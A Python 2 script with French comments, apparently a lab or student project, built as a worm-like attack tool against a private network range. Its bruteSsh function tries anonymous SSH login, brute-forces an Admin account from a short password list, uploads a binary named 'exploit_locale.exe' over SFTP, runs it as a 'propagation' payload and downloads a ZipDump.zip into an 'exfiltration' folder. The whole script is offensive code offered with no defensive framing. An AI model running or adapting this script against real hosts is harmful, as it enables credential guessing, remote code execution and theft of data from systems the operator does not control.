# -*- coding: utf-8 -*-

from logging import getLogger, ERROR # Import Logging Things	 	  
getLogger("scapy.runtime").setLevel(ERROR) # Get Rid if IPv6 Warning	  
from scapy.all import * # The One and Only Scapy                          
import sys, os, platform 						  
from datetime import datetime # Other stuff				  
from time import strftime						  
from ftplib import FTP							  
import paramiko								  
import socket								  
import re 								  
import time	

###########################################################################
ports = [21, 22, 25, 445 ] # ports a scanner
ip_start = "192.168.52."
ip_range = range(60, 80)
start_clock = datetime.now() # Start clock for scan time
interface = "eth0" #utilisé dans la récuparation d'adresses MAC
gateIP = "192.168.0.1"
passwords = ["test", "admin", "1234", "blabla"]
names = ['root','rminot','apinsard','msavigny']
###########################################################################

def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupération de données
	exec_dir = ""
	source = '/exploit-loco.exe'
	destination ='/home/Admin/Desktop/exploit_locale.exe'
	remotezip='/home/Admin/Desktop/ZipDump.zip'
	tolocalzip='/exfiltration/ZipDump.zip'
	#a activer ou désactiver pour le debug
	#paramiko.util.log_to_file("paramiko.log")
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(ip,port=22,username="Anonymous",password="")
		print "[*] Connexion Anonyme établie, envoi et execution du script de propagation"
		sftp = ssh.open_sftp()
		sftp.put(source,destination)
		stdin, stdout, stderr = ssh.exec_command('start exploit_locale.exe')
		time.sleep(5)
		sftp.get(remotezip,tolocalzip)
	except:
		print "[*] Authentiofication anonyme echouée, démmarage du bruteforce"
	ssh.close()

	
	for password in passwords:	
			
		try:
			ssh.connect(ip,port=22,username="Admin",password=password)
			print "[*] SSH IP: %s Password found: %s\n" % (ip,password)
		except paramiko.AuthenticationException:
			print "[*] SSH IP: %s Password failed: %s" % (ip,password)
			continue
			
		try:
			transport = paramiko.Transport((ip, 22))
			print password
			transport.connect(username = 'Admin', password = password)
			sftp = paramiko.SFTPClient.from_transport(transport)
		except:
			print "[*] erreur lors de l'ouverture du tunnel SFTP"
		try:
			sftp.put(source,destination)
			sftp.close
		except:
			print "[*] erreur lors du transfert sftp"
			break
		try:
     			print 'execution du payload'
			stdin, stdout, stderr = ssh.exec_command('cd /home/Admin/Desktop/')
			stdin, stdout, stderr = ssh.exec_command('./exploit_locale.exe')
			stdin, stdout, stderr = ssh.exec_command('./home/Admin/Desktop/exploit_locale.exe')
			time.sleep(5)
		except:
			print "[*] erreur lors de l'execution du payload"

		ssh.close()
bruteSsh('192.168.52.60')
